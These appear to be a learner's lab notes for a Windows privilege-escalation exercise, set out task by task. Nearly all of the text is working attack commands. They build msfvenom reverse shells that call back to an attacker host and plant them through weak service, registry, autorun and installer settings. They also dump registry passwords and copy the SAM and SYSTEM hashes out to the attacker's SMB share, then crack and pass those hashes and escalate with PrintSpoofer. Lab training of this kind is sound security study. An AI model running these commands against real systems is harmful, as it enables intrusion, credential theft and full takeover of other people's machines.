### Kali
      msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.45.46 LPORT=53 -f exe -o reverse.exe
      sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
### windows
      copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
### kali
      sudo nc -nvlp 53
           windows test with 
      C:\PrivEsc\reverse.exe

### TASK 3 
      C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
      Sc qc daclsvc [ see it runs with system priv ]
      sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\"" [ modify so it runs ]
      net start daclsvc

      Q1: C:\program files\dacl service\daclservice.exe
### Task 4
      Sc qc unquotedsvc
      C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\" [ can write to directory ]
      copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe" [ copy reverse shell and name it common ]
      Q1: C:\program files\unquoted path service\common files\unquotedpathservice.exe
### Task 5
      sc qc regsvc
      C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc

      Overwrite registry key 
      reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
### Task 6
      sc qc filepermsvc [system]
      C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe" [writeable by everyone]
      copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y [replace file]
### Task 7
      reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run [query autorun]
      C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe" [wrietable by all]
      copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y [overwrite exe]
      rdesktop 10.10.251.127

### Task 8
      reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated [ query for AlwaysInstall keys]
      on Kali 
      msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi 
      Transfer the reverse.msi file to the C:\PrivEsc directory on Windows (use the SMB server method from earlier).
      Start listener on kali
      msiexec /quiet /qn /i C:\PrivEsc\reverse.msi

### Task 9
      reg query HKLM /f password /t REG_SZ /s
      reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
      password123
      on kali 
      winexe -U 'admin%password' //10.10.251.127 cmd.exe

### Task 10
      cmdkey /list [ list saved creds]
      on kali
      runas /savecred /user:admin C:\PrivEsc\reverse.exe [ using runas users saved creds

### Task 11
      Transfer Sam and System files to kali VM 
      copy C:\Windows\Repair\SAM \\10.2.45.46\kali\
      copy C:\Windows\Repair\SYSTEM \\10.2.45.46\kali\

      on kali
      git clone https://github.com/Neohapsis/creddump7.git
      sudo apt install python-crypto
      python2 creddump7/pwdump.py SYSTEM SAM
      put those in a file then john dump –-format=nt
### Task 12
      Authenticate using the hash
      pth-winexe -U 'admin%hash' //10.10.251.127 cmd.exe
### Task 13 
      type C:\DevTools\CleanUp.ps1 [ view contents of script ]
      C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
      echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
      start listener on kali
### Task 14 
      rdesktop -u user -p password321 10.10.251.127
      tasklist /V | findstr mspaint.exe
      In Paint, click "File" and then "Open". In the open file dialog box, click in the navigation input and paste: file://c:/windows/system32/cmd.exe

### Task 15
      C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" [users can write to startup ]
      Using cscript, run the C:\PrivEsc\CreateShortcut.vbs script which should create a new shortcut to your reverse.exe executable in the StartUp directory:
      cscript C:\PrivEsc\CreateShortcut.vbs
      listener on kali then
      rdesktop -u admin 10.10.251.127


### Task 16
      SeImpersonatePrivilege
      SeAssignPrimaryTokenPrivilege 


### Task 17
      Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:
      C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
      Start another listener on Kali.
      Now, in the "local service" reverse shell you triggered, run the PrintSpoofer exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):
      C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i

### Task 18 
      Several tools have been written which help find potential privilege escalations on Windows. Four of these tools have been included on the Windows VM in the C:\PrivEsc directory:
      winPEASany.exe
      Seatbelt.exe
      PowerUp.ps1
      SharpUp.exe
